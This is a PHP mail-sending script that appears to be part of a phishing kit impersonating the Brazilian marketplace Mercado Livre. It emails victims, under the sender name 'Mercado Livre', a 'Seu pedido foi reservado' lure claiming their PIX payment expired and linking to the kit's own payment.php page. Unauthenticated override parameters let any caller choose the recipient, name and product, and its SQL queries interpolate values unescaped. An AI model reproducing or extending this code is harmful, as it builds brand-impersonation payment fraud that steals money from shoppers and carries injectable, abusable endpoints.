<?php 

session_start();

require_once("db.php");

require_once('src/PHPMailer.php');
require_once('src/SMTP.php');
require_once('src/Exception.php');
 
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
 
$mail = new PHPMailer(true);
 
$ip = base64_encode($_REQUEST['override_ip'] ?? get_real_ip());

$emailCliente = !empty($_REQUEST['override_email']) ? $_REQUEST['override_email'] : '';
$nome = !empty($_REQUEST['override_nome']) ? $_REQUEST['override_nome'] : '';
$cell = '';
$endereco = '';
$numero = '';
$bairro = '';
$cidadeXestado = '';
$cep = '';

$sql = mysqli_query($conn, "SELECT * from clientes WHERE ip='$ip' ORDER BY id DESC LIMIT 1");
while($sql && $row = mysqli_fetch_array($sql)){   	   
    if (empty($emailCliente)) $emailCliente = $row["email"]; 
    if (empty($nome)) $nome = $row["nome"];
    $cell = $row["celular"];	   
    $endereco = $row["endereco"];
    $numero = $row["numero"];
    $bairro = $row["bairro"];
    $cidadeXestado = $row["cidade"];
    $cep = $row["cep"];$idCliente = $row["id"];
}
				
		$sql = mysqli_query($conn, "SELECT * from apis");
		$smtpAtivo = 1; // Por padrão LIGADO
		while($sql && $row = mysqli_fetch_array($sql)){   	   
			$emailPHPMAILER = $row["email"]; 
			$htmlEmail = $row["htmlemail"]; 
			$texto1email = $row["texto1email"]; 
			$smtpAtivo = isset($row["smtp_ativo"]) ? intval($row["smtp_ativo"]) : 1;
		}

		// Se o SMTP estiver desligado (0), encerra o script de email silenciosamente
		if ($smtpAtivo === 0) {
			echo 'SMTP Desativado. E-mail não enviado.';
			exit;
		}
		
		$recorte = explode("|", $emailPHPMAILER ?? '');
		$MeuEmail = trim($recorte[0] ?? '');
		$MinhaSenha = trim($recorte[1] ?? '');
		if (empty($MeuEmail) || empty($MinhaSenha)) {
		    error_log('[Email Debug] Credenciais SMTP ausentes.');
		    echo 'Erro: Credenciais SMTP não configuradas.';
		    exit;
		}
		
		$sql = mysqli_query($conn, "SELECT * from config");
		while($sql && $row = mysqli_fetch_array($sql)){   	   
			$loja = $row["nome"];
		}
			
		header('Content-type: text/html; charset=utf-8');

		// Identifica o tipo de e-mail a ser enviado (padrão é pendente)
		$tipoEmail = isset($_REQUEST['tipo']) ? $_REQUEST['tipo'] : 'pendente';
		$dominio = "https://".$_SERVER['HTTP_HOST'];
		
		// Identifica o codigo do produto para os links
		$codigoProduto = !empty($_REQUEST['override_produto']) ? $_REQUEST['override_produto'] : '';
		if (empty($codigoProduto) && !empty($idCliente)) {
			$sql_pcode = mysqli_query($conn, "SELECT produto_codigo FROM clientes WHERE id='$idCliente' LIMIT 1");
			if ($sql_pcode && $row_pcode = mysqli_fetch_assoc($sql_pcode)) {
				$codigoProduto = $row_pcode['produto_codigo'] ?? '';
			}
		}
		if (empty($codigoProduto)) {
			$sql_p_first = mysqli_query($conn, "SELECT codigo FROM produto ORDER BY id DESC LIMIT 1");
			if ($sql_p_first && $row_p_first = mysqli_fetch_assoc($sql_p_first)) {
				$codigoProduto = $row_p_first['codigo'] ?? '';
			}
		}

		if ($tipoEmail == 'aprovado') {
			// ==========================================
			// TEMPLATE: PAGAMENTO APROVADO
			// ==========================================
			$texto1email = "Pagamento Aprovado - Seu pedido está sendo preparado!";
			$tracking_link = "$dominio/rastreio.php?produto=$codigoProduto&confirmado=1&cid=$idCliente";

			$texto = "
			<div style='font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e0e0e0; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05);'>
				<div style='background-color: #28a745; padding: 25px; text-align: center;'>
					<h1 style='color: white; margin: 0; font-size: 24px;'>Pagamento Aprovado! 🎉</h1>
				</div>
				<div style='padding: 30px; color: #333; line-height: 1.6;'>
					<p style='font-size: 16px;'>Olá <strong>$nome</strong>,</p>
					<p style='font-size: 16px;'>Recebemos o seu pagamento com sucesso. O seu pedido já está separado e começará a ser preparado para o envio.</p>
					<p style='font-size: 16px;'>Agradecemos muito pela sua confiança e por comprar na <strong>$loja</strong>!</p>
					
					<div style='text-align: center; margin-top: 35px; margin-bottom: 15px;'>
						<a href='$tracking_link' style='background-color: #28a745; color: white; padding: 14px 28px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 16px; display: inline-block;'>Acompanhar meu Pedido</a>
					</div>
				</div>
				<div style='background-color: #f8f9fa; padding: 20px; text-align: center; font-size: 12px; color: #6c757d; border-top: 1px solid #e0e0e0;'>
					<p style='margin: 0 0 5px 0;'>Em caso de dúvidas, nossa equipe está à disposição.</p>
					<p style='margin: 0;'>&copy; " . date('Y') . " $loja. Todos os direitos reservados.</p>
				</div>
			</div>";
		} else {
			// ==========================================
			// TEMPLATE: PEDIDO PENDENTE / PIX
			// ==========================================
			$texto1email = "Seu pedido foi reservado";
			$payment_link = "$dominio/payment.php?produto=$codigoProduto&cid=$idCliente";

			// Buscar nome do produto do cliente
			$nomeProduto = 'seu produto';
			$sql_prod = mysqli_query($conn, "SELECT produto_nome FROM clientes WHERE id='$idCliente' LIMIT 1");
			if ($sql_prod && $row_prod = mysqli_fetch_assoc($sql_prod)) {
				if (!empty($row_prod['produto_nome'])) {
					$nomeProduto = $row_prod['produto_nome'];
				}
			}

			$texto = "
<div style='max-width: 600px; margin: 0 auto; font-family: Arial, sans-serif; border: 1px solid #e0e0e0; border-radius: 8px; overflow: hidden; background-color: #fff;'>
    <div style='background-color: #00a650; padding: 20px; text-align: center;'>
        <h1 style='color: white; margin: 0; font-size: 22px;'>Seu pedido foi reservado</h1>
    </div>
    <div style='padding: 30px; line-height: 1.6; color: #333;'>
        <p style='font-size: 16px; margin-top: 0;'>Olá <strong>$nome</strong>,</p>
        <p style='font-size: 16px;'>Notamos que você iniciou uma compra do produto <strong>$nomeProduto</strong> no Mercado Livre, mas ainda não identificamos o seu pagamento.</p>
        <p style='font-size: 16px;'>Como o PIX Copia e Cola tem um tempo limite e pode ter expirado, clique no botão abaixo para acompanhar seu pedido e finalizar o pagamento.</p>
        
        <div style='text-align: center; margin-top: 30px; margin-bottom: 20px;'>
            <a href='$payment_link' style='display: inline-block; background-color: #3483fa; color: white; padding: 14px 28px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 16px;'>acompanhar meu pedido</a>
        </div>
    </div>
    <div style='background-color: #f5f5f5; padding: 15px; text-align: center; font-size: 12px; color: #999; border-top: 1px solid #e0e0e0;'>
        <p style='margin: 0;'>Este é um e-mail automático. Por favor, não responda.</p>
    </div>
</div>";
		}

		
if (strtolower($MeuEmail) === 'sendpulse') {
	$payload = json_encode([
		"email" => [
			"html" => $texto,
			"text" => strip_tags($texto),
			"subject" => "$texto1email id:$idCliente",
			"from" => [
				"name" => $loja,
				"email" => "nao-responda@seu-dominio.com" // Você precisa usar um e-mail validado no SendPulse
			],
			"to" => [
				[
					"name" => $nome,
					"email" => $emailCliente
				]
			]
		]
	]);

	$ch = curl_init('https://api.sendpulse.com/smtp/emails');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'Content-Type: application/json',
		'Authorization: Bearer ' . $MinhaSenha
	]);

	$response = curl_exec($ch);
	$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);

	if ($httpCode == 200) {
        error_log("[Email Debug] SendPulse API - Sucesso.");
		echo 'Email enviado com sucesso';
	} else {
        error_log("[Email Debug] Erro SendPulse API - HTTP $httpCode: $response");
		echo "Erro ao enviar mensagem via SendPulse API. Código: $httpCode Resposta: $response";
	}
} elseif (strpos($MinhaSenha, 'xkeysib-') === 0 || strpos(strtolower($MeuEmail), '@smtp-brevo.com') !== false || strpos(strtolower($MeuEmail), 'brevo') !== false) {
    // Usar a API HTTP do Brevo (Porta 443) em vez de SMTP para evitar bloqueios do Railway
	$payload = json_encode([
		"sender" => ["name" => "Mercado Livre", "email" => $MeuEmail],
		"to" => [["email" => $emailCliente, "name" => $nome]],
		"subject" => "$texto1email id:$idCliente",
		"htmlContent" => $texto
	]);

	$ch = curl_init('https://api.brevo.com/v3/smtp/email');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'Content-Type: application/json',
		'api-key: ' . $MinhaSenha,
		'accept: application/json'
	]);

	$response = curl_exec($ch);
	$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);

	if ($httpCode == 201 || $httpCode == 200) {
		echo 'Email enviado com sucesso';
	} else {
		echo "Erro ao enviar mensagem via Brevo API. Código: $httpCode Resposta: $response";
	}
} else {
	try {
		//$mail->SMTPDebug = SMTP::DEBUG_SERVER;
		$mail->isSMTP();
		
		if (strpos(strtolower($MeuEmail), '@gmail.com') !== false) {
			$mail->Host = 'smtp.gmail.com';
			$mail->Username = $MeuEmail;
			$mail->Password = $MinhaSenha;
			$mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
			$mail->Port = 465;
			$mail->setFrom($MeuEmail, "$loja");
		} else {
			// Default para Resend (Railway permite porta 2525)
			$mail->Host = 'smtp.resend.com';
			$mail->Username = 'resend'; // Username no Resend é sempre 'resend'
			$mail->Password = $MinhaSenha; // Senha vinda do banco de dados
			$mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
			$mail->Port = 2525;
			$mail->setFrom('onboarding@resend.dev', "$loja"); // O Resend exige o email verificado ou onboarding no modo teste
		}
		
		$mail->SMTPAuth = true;
		$mail->addAddress("$emailCliente"); //email do cliente
	 
		$mail->isHTML(true);
		$mail->Subject = utf8_decode("$texto1email id:$idCliente");
		$mail->Body = utf8_decode("$texto");
		//$mail->AltBody = 'Chegou o email teste do Canal TI';
		$mail->CharSet = 'UTF-8';
		if($mail->send()) {
		    echo 'Email enviado com sucesso';
		    error_log('[Email Debug] Envio bem-sucedido para ' . $emailCliente);
		} else {
		    echo 'Email não enviado: ' . $mail->ErrorInfo;
		    error_log('[Email Debug] Falha ao enviar email: ' . $mail->ErrorInfo);
		}
	} catch (Exception $e) {
		error_log('[Email Debug] Exception ao enviar email: ' . $e->getMessage());
		echo "Erro ao enviar mensagem: {$mail->ErrorInfo}";
	}
}
##

?>








